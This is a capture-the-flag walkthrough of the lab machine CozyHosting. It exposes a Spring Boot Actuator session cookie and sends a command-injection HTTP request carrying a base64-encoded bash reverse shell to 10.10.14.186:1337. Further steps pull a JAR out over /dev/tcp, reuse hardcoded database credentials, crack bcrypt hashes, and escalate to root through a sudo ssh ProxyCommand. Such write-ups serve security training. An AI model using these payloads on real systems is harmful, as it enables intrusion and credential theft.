# CTF Writeup: CozyHosting

## Lab Description

CozyHosting is an easy-difficulty Linux machine that features a `Spring Boot` application. The application has the `Actuator` endpoint enabled. Enumerating the endpoint leads to the discovery of a user&amp;#039;s session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application&amp;#039;s `JAR` file, hardcoded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user `josh`. The user is allowed to run `ssh` as `root`, which is leveraged to fully escalate privileges. 

---

## Reconaissance


An initial scan revealed the following services running on the target.

```
nmap -A -p- --min-rate 10000 10.129.229.88
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 03:47 EDT
Warning: 10.129.229.88 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.229.88
Host is up (0.075s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   102.65 ms 10.10.14.1
2   87.30 ms  10.129.229.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.98 seconds
```

Since this ssh version isn't exploitable, the initial access will most likely be through http. From the scan we were able to enumerate that it failed to redirect us to the domain "cozyhosting.htb". Let's map this domain to the target ip in our local dns file /etc/hosts

```
sudo echo "10.129.229.88 cozyhosting.htb" | sudo tee -a /etc/hosts
```

Enumerated hidden directories on cozyhosting.htb and retrieved an /admin panel which we don't have the auth to display.

```
gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 200) [Size: 0]
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
/%20                  (Status: 200) [Size: 0]
```



Enumerated an endpoint called "/actuator" using dirsearch, enumerated this endpoint specifically.

```
dirsearch -u http://cozyhosting.htb/actuator/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                  
 (_||| _) (/_(_|| (_| )                                                                           
                                                                                                  
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_cozyhosting.htb/_actuator__25-10-24_08-15-14.txt

Target: http://cozyhosting.htb/

[08:15:14] Starting: actuator/                                                                    
[08:15:15] 200 -    0B  - /actuator/%2e%2e//google.com
[08:15:15] 200 -    0B  - /actuator/%2e%2e;/test                            
[08:15:15] 200 -    0B  - /actuator/..;/                                    
[08:15:20] 200 -    0B  - /actuator/;/admin                                 
[08:15:20] 200 -    0B  - /actuator/;/json                                  
[08:15:20] 200 -    0B  - /actuator/;/login
[08:15:20] 200 -    0B  - /actuator/;login/                                 
[08:15:20] 200 -    0B  - /actuator/;json/                                  
[08:15:20] 200 -    0B  - /actuator/;admin/                                 
[08:15:20] 400 -  435B  - /actuator/\..\..\..\..\..\..\..\..\..\etc\passwd  
[08:15:21] 400 -  435B  - /actuator/a%5c.aspx                               
[08:15:22] 200 -    0B  - /actuator/actuator/;/caches                       
[08:15:22] 200 -    0B  - /actuator/actuator/;/beans
[08:15:22] 200 -    0B  - /actuator/actuator/;/auditevents                  
[08:15:22] 200 -    0B  - /actuator/actuator/;/conditions
[08:15:22] 200 -    0B  - /actuator/actuator/;/auditLog
[08:15:22] 200 -    0B  - /actuator/actuator/;/configurationMetadata        
[08:15:22] 200 -    0B  - /actuator/actuator/;/configprops
[08:15:22] 200 -    0B  - /actuator/actuator/;/dump
[08:15:22] 200 -    0B  - /actuator/actuator/;/env
[08:15:22] 200 -    0B  - /actuator/actuator/;/events
[08:15:22] 200 -    0B  - /actuator/actuator/;/exportRegisteredServices
[08:15:22] 200 -    0B  - /actuator/actuator/;/flyway
[08:15:22] 200 -    0B  - /actuator/actuator/;/health
[08:15:22] 200 -    0B  - /actuator/actuator/;/integrationgraph
[08:15:22] 200 -    0B  - /actuator/actuator/;/heapdump
[08:15:22] 200 -    0B  - /actuator/actuator/;/httptrace
[08:15:22] 200 -    0B  - /actuator/actuator/;/features
[08:15:22] 200 -    0B  - /actuator/actuator/;/liquibase
[08:15:22] 200 -    0B  - /actuator/actuator/;/jolokia
[08:15:22] 200 -    0B  - /actuator/actuator/;/info
[08:15:22] 200 -    0B  - /actuator/actuator/;/healthcheck
[08:15:22] 200 -    0B  - /actuator/actuator/;/loggers
[08:15:22] 200 -    0B  - /actuator/actuator/;/logfile
[08:15:22] 200 -    0B  - /actuator/actuator/;/registeredServices
[08:15:22] 200 -    0B  - /actuator/actuator/;/mappings
[08:15:22] 200 -    0B  - /actuator/actuator/;/sso
[08:15:22] 200 -    0B  - /actuator/actuator/;/shutdown                     
[08:15:22] 200 -    0B  - /actuator/actuator/;/releaseAttributes
[08:15:22] 200 -    0B  - /actuator/actuator/;/ssoSessions
[08:15:22] 200 -    0B  - /actuator/actuator/;/scheduledtasks
[08:15:22] 200 -    0B  - /actuator/actuator/;/loggingConfig
[08:15:22] 200 -    0B  - /actuator/actuator/;/prometheus
[08:15:22] 200 -    0B  - /actuator/actuator/;/sessions
[08:15:22] 200 -    0B  - /actuator/actuator/;/resolveAttributes
[08:15:22] 200 -    0B  - /actuator/actuator/;/threaddump
[08:15:22] 200 -    0B  - /actuator/actuator/;/refresh                      
[08:15:22] 200 -    0B  - /actuator/actuator/;/status                       
[08:15:22] 200 -    0B  - /actuator/actuator/;/metrics
[08:15:22] 200 -    0B  - /actuator/actuator/;/trace
[08:15:22] 200 -    0B  - /actuator/actuator/;/statistics
[08:15:22] 200 -    0B  - /actuator/actuator/;/springWebflow
[08:15:23] 200 -    0B  - /actuator/admin/%3bindex/                         
[08:15:24] 200 -    0B  - /actuator/Admin;/                                 
[08:15:24] 200 -    0B  - /actuator/admin;/                                 
[08:15:32] 200 -    0B  - /actuator/axis2//axis2-web/HappyAxis.jsp          
[08:15:32] 200 -    0B  - /actuator/axis//happyaxis.jsp                     
[08:15:32] 200 -    0B  - /actuator/axis2-web//HappyAxis.jsp                
[08:15:33] 200 -  124KB - /actuator/beans                                   
[08:15:35] 200 -    0B  - /actuator/Citrix//AccessPlatform/auth/clientscripts/cookies.js
[08:15:39] 200 -    0B  - /actuator/engine/classes/swfupload//swfupload_f9.swf
[08:15:39] 200 -    5KB - /actuator/env                                     
[08:15:39] 200 -    0B  - /actuator/engine/classes/swfupload//swfupload.swf 
[08:15:39] 200 -    0B  - /actuator/examples/jsp/%252e%252e/%252e%252e/manager/html/
[08:15:40] 200 -    0B  - /actuator/extjs/resources//charts.swf             
[08:15:41] 200 -   15B  - /actuator/health                                  
[08:15:42] 200 -    0B  - /actuator/html/js/misc/swfupload//swfupload.swf   
[08:15:44] 200 -    0B  - /actuator/jkstatus;                               
[08:15:45] 200 -    0B  - /actuator/login.wdm%2e                            
[08:15:46] 200 -   10KB - /actuator/mappings                                
[08:15:55] 200 -  148B  - /actuator/sessions                                
                                                                             
Task Completed
```

Checking the /session endpoint, provides us with an Session Cookie for user "kanderson"


```
curl http://cozyhosting.htb/actuator/sessions | jq .                      
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    48    0    48    0     0   1347      0 --:--:-- --:--:-- --:--:--  1371
{
  "C2739F712DCABF9B79E98529B4E57905": "kanderson"
}
```

kanderson:C2739F712DCABF9B79E98529B4E57905

Intercepted network traffic on /login page & pasted admin session cookie inside the request, but unfortunately it didn't seem to work. 

Opened up dev console on webpage by pressing rightclick and choosing "inspect". Navigated onto "Storage" --> "Cookies" --> and pasted SESSION Cookie of kanderson inside it --> login page disappeared and navigated to /admin directory. We are in the admin dashboard/panel now.

Below there is a submit button, which requires an hostname & username parameter to entry, let's intercept this traffic. The Endpoint is called /executessh. I'm assuming this will execute an ssh command.

The username parameter is vulnerable to command injection, but protected by an "no space filter". Which means we have to utilize braceexpanding technique.

This command in the username parameter, should look like this in order to work. We utilized brace expansion technique & also put an semicolon in front & on the back. Otherwise command injection doesn't work.

```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://cozyhosting.htb
Connection: keep-alive
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=40D62492DAA3484BFAA776E07B8A0AE6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

host=10.10.14.186&username=;{sleep,10};
```

An normal revshell script, didn't work even with brace expansion technique. I'm assuming we need to somehow encode this in base64.

our revshell payload looks like this:

```
bash -i >& /dev/tcp/10.10.14.186/1337 0>&1
```

Let's base64 encode this using the following command:


```
base64 -w 0 revshell > revshell_base64
```

Let's remove all the "+" & "=" symbols, by adding more spaces at some places and adding 2x more spaces at the end.

Script should look like this:

```
bash -i  >& /dev/tcp/10.10.14.186/1337   0>&1  
```

Encode it with base64 again, script should look like this now.


```
base64 -w 0 revshell > revshell_base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTg2LzEzMzcgICAwPiYxKysK
```


## Initial Access


Starting up our listener on port 1337

```
nc -lvnp 1337
```


The following Network Package gave us an reverse shell.



```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
Origin: http://cozyhosting.htb
Connection: keep-alive
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=40D62492DAA3484BFAA776E07B8A0AE6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

host=10.10.14.186&username=;{echo,-n,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTg2LzEzMzcgICAwPiYxICAK}|{base64,-d}|bash;
```

```
nc -lvnp 1337                         
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.229.88] 35806
bash: cannot set terminal process group (1009): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$
```

## Privelege Escalation

Users on the target server.

```
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
```

Enumerating files owned by postgresql admin.

```
find / -user postgres 2>/dev/null
/etc/postgresql
/etc/postgresql/14
/etc/postgresql/14/main
/etc/postgresql/14/main/pg_ctl.conf
/etc/postgresql/14/main/pg_hba.conf
/etc/postgresql/14/main/start.conf
/etc/postgresql/14/main/environment
/etc/postgresql/14/main/pg_ident.conf
/etc/postgresql/14/main/postgresql.conf
/etc/postgresql/14/main/conf.d
```

Those files potentially could contain credentials, let's inspect them.

Didn't find any valuable information, let's enumerate further. 
Within the /app directory there is an interesting .jar file, let's download it to local machine and extract it.

On target server

```
cat cloudhosting-0.0.1.jar > /dev/tcp/10.10.14.186/8888
```

On local machine

```
nc -lvnp 8888 > cloudhosting.jar
```

unzipped cloudhosting.jar & retrieved 3 folders "BOOT-INF", "META-INF" and "org". Enumerated BOOT-INF
and retrieved postgres:Vg&nvzAQ7XxR credentials in BOOT-INF/classes/application.properties

```
cat application.properties  
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

We were also able to retrieve information that the postgreSQL database is running on localhost port 5432, let's confirm this.


```
app@cozyhosting:/app$ netstat -tulnp
netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1009/java           
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           - 
```


Now that we have the credentials for the postgresql administrator & we know the database is running on localhost:5432. Let's connect to it!
Unfortunately my shell crashed multiple times, when trying to connect to the database.
An quick fix for this was actually performing shell hardening, before connecting to the postgresql database.


```
app@cozyhosting:/app$ psql -h localhost -U postgres
psql -h localhost -U postgres
Password for user postgres: Vg&nvzAQ7XxR
[CRASHED]
```

Performing shell hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Now when trying to connect to the database, we gain access.


```
app@cozyhosting:/app$ psql -h localhost -U postgres
psql -h localhost -U postgres
Password for user postgres: Vg&nvzAQ7XxR

psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

Enumerating databases:

```
postgres-# \list
\list
WARNING: terminal is not fully functional
Press RETURN to continue 

                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
eges   
-------------+----------+----------+-------------+-------------+----------------
-------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
(4 rows)
```

"cozyhosting" database, looks like the way to go, but I can't navigate into it, so I decided to quit out of the prompt and reconnect with an specified database.

```
app@cozyhosting:/app$ psql -h localhost -U postgres -d cozyhosting
psql -h localhost -U postgres -d cozyhosting
Password for user postgres: Vg&nvzAQ7XxR

psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

cozyhosting=# 
```

Listing out all the tables within cozyhosting database.

```
cozyhosting=# \d
\d
WARNING: terminal is not fully functional
Press RETURN to continue 

              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

```

Checking out the content of the users table.


```
cozyhosting=# select * from users;
select * from users;
WARNING: terminal is not fully functional
Press RETURN to continue 

   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
n
(2 rows)
```

Gained encoded passwords of user "kanderson" & admin, let's decode those.

Bruteforced password using john the ripper & rockyou.txt

```
john database_pw.hash --wordlist=/usr/share/wordlists/rockyou.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
No password hashes left to crack (see FAQ)
```
```
john --show database_pw.hash                                     
?:manchesterunited

1 password hash cracked, 0 left
```

Logged into user josh with credentials --> josh:manchesterunited

```
ssh josh@cozyhosting.htb    
josh@cozyhosting.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 24 09:35:02 PM UTC 2025

  System load:           0.0029296875
  Usage of /:            53.3% of 5.42GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             243
  Users logged in:       0
  IPv4 address for eth0: 10.129.229.88
  IPv6 address for eth0: dead:beef::250:56ff:fe94:89b6


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
josh@cozyhosting:~$
```

Retrieved user.txt in /home/josh directory.


Running sudo -l on user josh provides us with ssh binary, which we are able to run on root rights, but only through localhost. Which means we have to portforward the ssh service first to our local machine!

```
ssh john@cozyhosting.htb -L 9999:127.0.0.1:22
```

This didn't seem to work & I think I thought of this to complex, let's navigate to gtfobins.github.io and search for "ssh" binary, there is an PoC which we can utilize when ssh binary has Sudo right.

Prompted this into the shell & gained root shell.

```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
```

Retrieved root.txt in /root directory.


```
369dc152b21d6afd446990bd3c019e66
```
